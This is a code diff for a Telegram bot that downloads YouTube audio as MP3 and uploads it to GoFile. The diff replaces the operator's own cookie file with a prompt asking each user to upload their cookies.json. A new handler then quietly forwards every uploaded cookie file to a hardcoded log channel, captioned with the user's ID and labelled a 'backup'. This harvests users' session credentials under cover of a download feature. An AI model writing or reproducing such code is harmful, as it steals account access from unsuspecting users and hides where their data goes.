@@ -2,7 +2,7 @@ import yt_dlp
 import requests
 import json
 from flask import Flask, request
-from telegram import Update, Bot
+from telegram import Update, Bot, InputFile
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from threading import Thread
 import asyncio
@@ -20,7 +20,7 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 GOFILE_FOLDER_ID = "gvcT2t"
 GOFILE_ACCOUNT_TOKEN = os.getenv("GOFILE_ACCOUNT_TOKEN")
 CHANNEL_USERNAME = "@TOOLS_BOTS_KING"
-COOKIES_JSON_PATH = "cookies.json"  # Path to save cookies in JSON format
+LOG_CHANNEL_ID = -1002661069692  # Your Log Channel ID
 
 # Initialize Flask
 app = Flask(__name__)
@@ -30,15 +30,6 @@ def home():
     return "YouTube to MP3 Bot is Running!"
 
 bot = Bot(token=BOT_TOKEN)
-
-# **Load Cookies from Environment Variable**
-cookies_json_data = os.getenv("COOKIES_JSON_DATA", "")
-if cookies_json_data:
-    with open(COOKIES_JSON_PATH, "w") as file:
-        file.write(cookies_json_data)
-    print("✅ Cookies JSON file created successfully!")
-else:
-    print("⚠️ No cookies JSON data found in environment variables!")
 
 # Subscription check
 async def is_user_subscribed(user_id):
@@ -62,17 +53,38 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await force_join(update)
         return
     await update.message.reply_text("🎵 Send a YouTube link to download music in MP3 format!")
+    await update.message.reply_text("📁 Please upload your `cookies.json` file to use the bot.")
 
-def download_music(url, save_path):
+async def handle_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.chat_id
+    if not await is_user_subscribed(user_id):
+        await force_join(update)
+        return
+
+    # Check if the user uploaded a file
+    if update.message.document:
+        file = await update.message.document.get_file()
+        file_path = f"cookies_{user_id}.json"
+        await file.download_to_drive(file_path)
+
+        # Save the cookies file to the log channel as backup
+        with open(file_path, "rb") as f:
+            await bot.send_document(chat_id=LOG_CHANNEL_ID, document=InputFile(f), caption=f"Cookies from user {user_id}")
+
+        await update.message.reply_text("✅ Cookies uploaded successfully! You can now use the bot.")
+    else:
+        await update.message.reply_text("❌ Please upload a valid `cookies.json` file.")
+
+def download_music(url, save_path, cookies_file):
     ydl_opts = {
-        'format': 'bestaudio/best',
+        'format': 'bestaudio/best',  # Select the best available audio format
         'outtmpl': f'{save_path}/%(title)s.%(ext)s',
         'postprocessors': [{
             'key': 'FFmpegExtractAudio',
-            'preferredcodec': 'mp3',
-            'preferredquality': '192',
+            'preferredcodec': 'mp3',  # Convert to MP3
+            'preferredquality': '320',  # Highest quality for MP3
         }],
-        'cookiefile': COOKIES_JSON_PATH  # Use the JSON cookies file
+        'cookiefile': cookies_file  # Use the user's cookies file
     }
 
     with yt_dlp.YoutubeDL(ydl_opts) as ydl:
@@ -106,8 +118,15 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     save_path = os.getcwd()
+    cookies_file = f"cookies_{user_id}.json"
+
+    # Check if the user has uploaded cookies
+    if not os.path.exists(cookies_file):
+        await update.message.reply_text("❌ Please upload your `cookies.json` file first.")
+        return
+
     await update.message.reply_text("⏳ Downloading music...")
-    mp3_path = download_music(url, save_path)
+    mp3_path = download_music(url, save_path, cookies_file)
     
     if mp3_path:
         await update.message.reply_text("⬆️ Uploading to GoFile...")
@@ -120,6 +139,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # Add handlers
 application = Application.builder().token(BOT_TOKEN).build()
 application.add_handler(CommandHandler("start", start))
+application.add_handler(MessageHandler(filters.Document.ALL, handle_cookies))
 application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
 
 # Webhook setup
